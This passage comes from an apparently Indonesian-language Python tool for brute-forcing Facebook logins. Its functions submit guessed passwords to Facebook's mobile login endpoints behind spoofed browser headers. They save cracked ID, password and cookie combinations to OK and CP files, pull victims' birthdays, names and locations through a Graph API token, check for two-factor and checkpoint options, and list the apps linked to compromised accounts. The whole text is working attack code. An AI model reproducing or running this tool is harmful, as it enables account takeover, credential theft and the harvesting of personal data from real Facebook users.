						cek_apk(idf,pw,kuki)
						break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		#except Exception as e:print(e)
	loop+=1
	
###-------[ Validate metode ]--------]###
def Validate(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	ua = random.choice(redmi_5a)
	print(f"\r {bb}>>{P} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			vald = ses.get(f"https://{url}/login/device-based/password/?uid={idf}&flow=login_no_pin")
			parsing = parser(vald.text,"html.parser")
			action = parsing.find("form",{"method":"post"})["action"]
			headers = {"Host": url,"connection":"keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://"+url,"content-type": "application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","dnt": "1","sec-ch-ua": "' Not A;Brand';v='99', 'Chromium';v='99'","sec-ch-ua-mobile":"?1","sec-ch-ua-platform":"'Android'","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-user": "?1","sec-fetch-dest": "document","upgrade-insecure-requests":"1","user-agent": "Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5","referer": f"https://{url}/login/device-based/password/?uid={idf}&flow=login_no_pin","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(vald.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(vald.text)).group(1),"uid":idf,"flow":"login_no_pin","pass": pw,"next": "https://"+url+"/login/save-device/"}
			post = ses.post(f"https://{url}"+action, data=data, headers=headers)
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in rescp:pass
				else:
					rescp.append(data)
					cp+=1
					if 'ya' in cepeh:
						cek_opsi(idf,pw,ua)
					else:
						try:
							token = open('.token.txt','r').read()
							mkz = {"cookie":open('.cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=mkz).json()['birthday']
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r {kk}>{P} ID FB  : {kk}{idf}{P}          \n {kk}>{P} sandi  : {kk}{pw}          {P}\n {kk}>{P} lahir  : {kk}{d} {m} {y}{P}           \n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+only_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\r {kk}>{P} ID FB  : {kk}{idf}{P}          \n {kk}>{P} sandi  : {kk}{pw}          {P}\n {kk}>{P} User agent : {bb}User agent yang anda gunakan bersifat tunggal\n')
							open('CP/'+only_cp,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('OK/'+only_ok,'a').write(data+'\n')
					if "coki" in akunok:
						print(f'\r {hh}>{P} ID FB  : {hh}{idf}{P}          \n {hh}>{P} sandi  : {hh}{pw}          {P}\n {hh}>{P} cookie : {hh}{kuki}{P}\n')
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		#except Exception as e:print(e)
	loop+=1
###---[ CEK OPSI AKUN CP ]---###
opsi = []
def sesi(res):
	response = parser(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
	r = parser(ses.post('https://m.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		opsi.append(i.text)
	return opsi		

def cek_opsi(idf,pw,ua):
	akun = ''
	try:
		token = open('.token.txt','r').read()
		bas = {"cookie":open('.cookie.txt','r').read()}
		infock = ses.get(f'https://graph.facebook.com/{idf}?fields=name,id,birthday,first_name,middle_name,last_name,link,gender,religion,short_name,relationship_status,significant_other,location,hometown,about,locale&access_token={token}',cookies=bas)
		try:nm = infock["name"]
		except (KeyError,IOError):nm = ("not found")
		try:lk = infock["link"]
		except (KeyError,IOError):lk = ("not found")
		try:tm = infock["location"]["name"]
		except (KeyError,IOError):tm = ("not found")
		#ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
		#m, d, y = ttl.split('/')
		#m = tete[m]
		akun += f' {kk}>{P} nama  : {kk}{nm}{P}          \n {kk}>{P} ID FB  : {kk}{idf}{P}          \n {kk}>{P} sandi  : {kk}{pw}          {P}\n {kk}>{P} link  : {kk}{lk}{P}  \n {kk}>{P} City  : {kk}{tm}{P}          '
		#mek = f"{idf}|{pw}|{day} {month} {year}"
		if 'file' in detek:pass
		else:open('CP/'+only_cp,'a').write(mek+'\n')
	except:
		month = ""
		day = ""
		year = ""
		akun += f' {kk}>{P} ID FB  : {kk}{idf}{P}          \n {kk}>{P} sandi  : {kk}{pw}          {P}'
		if 'file' in detek:pass
		else:open('CP/'+only_cp,'a').write(idf+'|'+pw+'\n')
	try:
		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua}
		res = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers = h2).text
		ress = parser(res, 'html.parser')
		form = ress.find('form',{'method':'post'})
		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
		data2.update({
					'email':idf,
					'pass':pw})
		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
		ress = parser(res, 'html.parser')
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			akun += f'\n {hh}>{P} hore akun tap yes                       '
		else:
			if(len(sesi(res))==0):
				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
					akun += f'\n {kk}>{P} akun terpasang A2F                     '
				else:
					cok = convert(ses.cookies.get_dict())
					akun += f'\n {hh}>{P} akun tidak checkpoint                       \n {hh}>{P} cookie : {cok}'
			else:
				akun += f'\n {kk}>{P} ada {len(opsi)} opsi :                     '
				o = 0
				for cp in opsi:
					o+=1
					akun += f'\n {kk}{o}{P} {cp}               '
		opsi.clear()
	except Exception as e:
		akun += f'\n {M}>{P} kata sandi salah / spam                      '
	print('\r'+ akun)
	print('\r                                                                       ')
		
				
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))


###---[ CEK APLIKASI ]---###
#--[ convert bahasa ]--#
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

#--[ pusat print ]--#
apk1, apk2, apk3 = [], [], []
def cek_apk(idf,pw,kuki):
	cookie = {"cookie" : kuki}
	language(cookie)
	akun = (f' {hh}>{P} ID FB  : {hh}{idf}{P}          \n {hh}>{P} sandi  : {hh}{pw}          {P}\n {hh}>{P} cookie : {hh}{kuki}{P}')
	try:		
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed"
		get_remove(url,cookie)
	except Exception as e:pass
	print('\r'+akun)
	if len(apk1)==0:pass
	else:
		akun = (f' {bb}>{P} aplikasi ditambahkan :                     ')
		no = 0
		for apk in apk1:
			no += 1
			akun += (f'\n {bb}> {hh}{no} {hh}{apk.lower()}            ')
		print('\r'+akun)
	if len(apk2)==0:pass
	else:
		akun = (f' {bb}>{P} aplikasi kadaluwarsa :                   ')
		no = 0
		for apk in apk2:
			no += 1
			akun += (f'\n {bb}> {kk}{no} {kk}{apk.lower()}             ')
		print('\r'+akun)
	if len(apk3)==0:pass
	else:
		akun = (f' {M}>>{P} aplikasi yang dihapus :                  ')
		no = 0
		for apk in apk3:
			no += 1
			akun += (f'\n {M}> {no} {M}{apk.lower()}               ')
		print('\r'+akun)
	apk1.clear()
	apk2.clear()
	apk3.clear()
	print("\r                                             ")
			
			
#--[ cek apk aktif ]--#
def get_active(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Ditambahkan' in apk.text:					
				apk1.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_active(next,cookie)
	except:pass

#--[ cek apk kadaluarsa ]--#
def get_inactive(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Kedaluwarsa' in apk.text:
				apk2.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_inactive(next,cookie)
	except:pass

#--[ cek apk dihapus ]--#		
def get_remove(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Dihapus' in apk.text:
				apk3.append(f"{str(apk.text).replace('Dihapus',' Dihapus')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_remove(next,cookie)
	except:pass
	
def masuk():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('git pull')
	except:pass
	clear_layar()
	kembali()



if __name__=='__main__':
	masuk()